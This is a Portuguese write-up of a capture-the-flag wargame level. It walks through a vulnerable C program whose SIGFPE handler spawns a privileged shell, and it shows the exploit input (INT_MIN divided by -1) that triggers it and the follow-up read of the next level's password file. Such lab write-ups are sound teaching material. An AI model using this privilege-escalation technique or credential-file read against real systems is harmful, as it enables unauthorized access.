# ~ Level 02 ~

```
cd /levels
./level02
source code is available in level02.c
```

Desta vez o game foi um pouco mais explícito.

Analisei o código em *level02.c*

```
cat level02.c
//a little fun brought to you by bla

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void catcher(int a)
{
        setresuid(geteuid(),geteuid(),geteuid());
        printf("WIN!\n");
        system("/bin/sh");
        exit(0);
}

int main(int argc, char **argv)
{
        puts("source code is available in level02.c\n");

        if (argc != 3 || !atoi(argv[2]))
                return 1;
        signal(SIGFPE, catcher);
        return abs(atoi(argv[1])) / atoi(argv[2]);
}
```

Parece ser o source code do level02. 

** Pare sua leitura por aqui se não quiser spoilers ;) **

===========================================
## DICA 01:
O source code é real.
===========================================

===========================================
## DICA 02:

Você quer forçar o software à chamar o método *catcher*.
===========================================

## Resolução:

Vamos analisar melhor.

Vemos que o método catcher nos leva à resolução do nível. Então temos de utilizar artifícios para chamá-lo.

```
signal(SIGFPE, catcher);
```

Esta linha atribue uma conexão do sinal SIGFPE ao método catcher, isto significa que lançar um sinal SIGFPE é o que iremos buscar.

(**NOTA:** SIGFPE é a representação de uma exceção fatal error, uma chamada lançada pelo sistema. Conseguimos este por exemplo com divisões de zero, overflows e etc)

Notamos que o argv[1] é divido pelo argv[2].

Todavia, não conseguimos forçar o envio do sinal SIGFPE através de uma divisão por zero, neste caso.

Então buscamos sobre o método *atoi*.

*If the converted value would be out of the range of representable values by an int, it causes undefined behavior. *

Ref: http://www.cplusplus.com/reference/cstdlib/atoi/

Encontramos algo interessante para se exploitar.

Vamos verificar os limites de um *int*. Notei que o mesmo vai de -2147483648 à +2147483647.

Ref: https://www.tutorialspoint.com/c_standard_library/limits_h.htm

(Variáveis *INT_MAX* e *INT_MIN*)

Lendo sobre o método *signal*, temos um outro auxílio:

``` 
Integer division by zero has undefined result. On some architectures it will generate a SIGFPE signal. (Also dividing the most negative integer by -1 may generate SIGFPE.)
```

Ref: https://linux.die.net/man/2/signal 

Já que não conseguimos a divisão por zero, podemos tentar o segundo caso.

PORÉM, temos o método *abs*, evitando que consigamos essa divisão desta forma.

E se tentarmos inverter a lógica?

```
./level02 -2147483648 -1
source code is available in level02.c

WIN!
sh-4.3$
```

Conseguimos!!!

```
cat /home/level3/.pass
##############
```